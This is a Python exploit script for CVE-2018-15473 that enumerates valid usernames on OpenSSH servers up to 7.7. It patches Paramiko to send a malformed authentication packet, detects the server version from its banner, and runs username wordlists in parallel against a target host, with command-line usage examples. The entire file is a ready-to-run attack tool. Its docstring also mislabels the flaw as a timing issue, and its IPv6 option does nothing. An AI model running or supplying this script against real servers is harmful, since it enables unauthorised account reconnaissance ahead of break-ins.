
#!/usr/bin/env python3
"""
CVE-2018-15473 - OpenSSH Username Enumeration
Paramiko 4.x - Versión Simple sin Colores

Derived from work done by Matthew Daley
https://bugfuzz.com/stuff/ssh-check-username.py

OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an
invalid authenticating user until after the packet containing the request has been fully parsed.

Author: epi - https://epi052.gitlab.io/notes-to-self/
"""
import sys
import re
import socket
import logging
import argparse
import multiprocessing
from typing import Optional, Tuple
from pathlib import Path
import paramiko
from paramiko.auth_handler import AuthHandler
from paramiko.message import Message

assert sys.version_info >= (3, 6), "This program requires python3.6 or higher"


class InvalidUsername(Exception):
    """Raised when username not found via CVE-2018-15473."""
    pass


def apply_monkey_patch() -> None:
    """Apply monkey patch to exploit CVE-2018-15473 in Paramiko 4.x
    
    This exploits a timing vulnerability in OpenSSH <= 7.7 where invalid
    usernames fail authentication faster than valid usernames.
    """
    
    def patched_add_boolean(*args, **kwargs):
        """Malformed boolean - used to create invalid auth packet."""
        pass
    
    # Store original methods
    original_parse_service_accept = AuthHandler._parse_service_accept
    original_parse_userauth_failure = AuthHandler._parse_userauth_failure
    
    def patched_parse_service_accept(self, m):
        """Intercept service accept to inject malformed packet."""
        old_add_boolean = Message.add_boolean
        Message.add_boolean = patched_add_boolean
        
        try:
            return original_parse_service_accept(self, m)
        finally:
            Message.add_boolean = old_add_boolean
    
    def patched_parse_userauth_failure(self, m):
        """Detect userauth failure - indicates invalid username."""
        raise InvalidUsername("User not found")
    
    # Apply patches
    AuthHandler._parse_service_accept = patched_parse_service_accept
    AuthHandler._parse_userauth_failure = patched_parse_userauth_failure


def create_socket(hostname: str, port: int) -> Optional[socket.socket]:
    """Create and return a connected socket."""
    try:
        sock = socket.create_connection((hostname, port), timeout=10)
        return sock
    except socket.error:
        return None


def detect_openssh_version(hostname: str, port: int) -> Tuple[Optional[float], Optional[str]]:
    """Detect OpenSSH version from SSH banner.
    
    Returns:
        Tuple of (version_float, banner_string) or (None, banner_string)
    """
    sock = create_socket(hostname, port)
    if not sock:
        return None, None
    
    try:
        sock.settimeout(5)
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        
        # Parse version from banner
        regex = re.search(r'-OpenSSH_(?P<version>\d+\.\d+)', banner)
        if regex:
            try:
                version = float(regex.group('version'))
                return version, banner
            except ValueError:
                return None, banner
        return None, banner
        
    except socket.timeout:
        try:
            sock.close()
        except:
            pass
        return None, "TIMEOUT"
    except Exception as e:
        try:
            sock.close()
        except:
            pass
        return None, str(e)


def connect(username: str, hostname: str, port: int, verbose: bool = False, **kwargs) -> None:
    """Enumerate single username via SSH auth attempt.
    
    Args:
        username: Username to test
        hostname: Target host
        port: SSH port
        verbose: Print non-matching usernames
    """
    sock = create_socket(hostname, port)
    if not sock:
        if verbose:
            print(f'[-] {username} - Socket creation failed')
        return
    
    try:
        # Create transport with proper error handling
        transport = paramiko.Transport(sock)
        transport.set_hexdump(False)
        
        # Set socket timeout before start_client
        sock.settimeout(10)
        
        try:
            # Start SSH client negotiation
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            if verbose:
                print(f'[-] {username} - SSH negotiation failed')
            return
        except Exception:
            if verbose:
                print(f'[-] {username} - Negotiation error')
            return
        
        # Attempt public key authentication to trigger the vulnerability
        try:
            # Generate temporary RSA key for authentication attempt
            pkey = paramiko.RSAKey.generate(1024)
            transport.auth_publickey(username, pkey)
            
        except paramiko.ssh_exception.AuthenticationException:
            # This exception means auth failed but username was valid
            print(f"[+] {username} FOUND")
            
        except InvalidUsername:
            # This exception means username was rejected (doesn't exist)
            if verbose:
                print(f'[-] {username} not found')
                
        except paramiko.ssh_exception.SSHException:
            # SSH-level error
            if verbose:
                print(f'[-] {username} - SSH error')
                
        except Exception as e:
            # Catch any other unexpected errors
            if verbose:
                print(f'[-] {username} - Error: {type(e).__name__}')
    
    finally:
        # Ensure cleanup
        try:
            transport.close()
        except:
            pass
        try:
            sock.close()
        except:
            pass


def main(**kwargs):
    """Main entry point."""
    hostname = kwargs.get('hostname')
    port = kwargs.get('port')
    verbose = kwargs.get('verbose')
    threads = kwargs.get('threads')
    
    print(f"\n[*] Target: {hostname}:{port}\n")
    
    # Detect OpenSSH version
    print("[*] Detecting OpenSSH version...")
    version, banner = detect_openssh_version(hostname, port)
    
    if version:
        if version <= 7.7:
            status = "VULNERABLE"
        else:
            status = "PATCHED"
        print(f"[+] OpenSSH {version} detected - Status: {status}\n")
    elif banner:
        print(f"[!] OpenSSH version not recognized in banner: {banner}\n")
    else:
        print("[!] Could not detect OpenSSH version\n")
    
    # Apply vulnerability exploit
    print("[*] Applying CVE-2018-15473 monkey patch...")
    apply_monkey_patch()
    print("[*] Monkey patch applied successfully\n")
    
    # Test single username
    if kwargs.get('username'):
        username = kwargs.get('username').strip()
        print(f"[*] Testing single username: {username}\n")
        return connect(username, hostname, port, verbose)
    
    # Enumerate from wordlist
    wordlist_path = kwargs.get('wordlist')
    if not Path(wordlist_path).exists():
        print(f"[!] Wordlist not found: {wordlist_path}")
        return
    
    # Count total users
    try:
        with open(wordlist_path) as f:
            usernames = [u.strip() for u in f if u.strip()]
        total = len(usernames)
    except Exception as e:
        print(f"[!] Error reading wordlist: {e}")
        return
    
    print(f"[*] Enumerating {total} usernames with {threads} threads")
    print(f"[*] Starting enumeration...\n")
    
    # Run enumeration in parallel
    try:
        with multiprocessing.Pool(threads) as pool:
            pool.starmap(
                connect,
                [(user, hostname, port, verbose) for user in usernames]
            )
    except KeyboardInterrupt:
        print("\n[!] Enumeration interrupted by user")
        return
    
    print(f"\n[*] Enumeration complete!")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="OpenSSH Username Enumeration (CVE-2018-15473) - Paramiko 4.x",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Single user:  python3 %(prog)s target.com -u admin
  Wordlist:     python3 %(prog)s target.com -w users.txt
  Verbose:      python3 %(prog)s target.com -w users.txt -v
  Custom port:  python3 %(prog)s target.com -p 2222 -w users.txt -t 10
        """
    )
    
    parser.add_argument('hostname', help='Target hostname/IP', type=str)
    parser.add_argument('-p', '--port', help='SSH port (default: 22)', default=22, type=int)
    parser.add_argument('-t', '--threads', help='Number of threads (default: 4)', default=4, type=int)
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        default=False,
        help='Print both found and not found usernames'
    )
    parser.add_argument('-6', '--ipv6', action='store_true', help='IPv6 address')
    
    multi_or_single = parser.add_mutually_exclusive_group(required=True)
    multi_or_single.add_argument('-w', '--wordlist', type=str, help='Path to wordlist file')
    multi_or_single.add_argument('-u', '--username', type=str, help='Single username to test')
    
    args = parser.parse_args()
    
    # Suppress paramiko logging
    logging.getLogger('paramiko').setLevel(logging.CRITICAL)
    
    try:
        main(**vars(args))
    except KeyboardInterrupt:
        print("\n[!] Execution cancelled by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
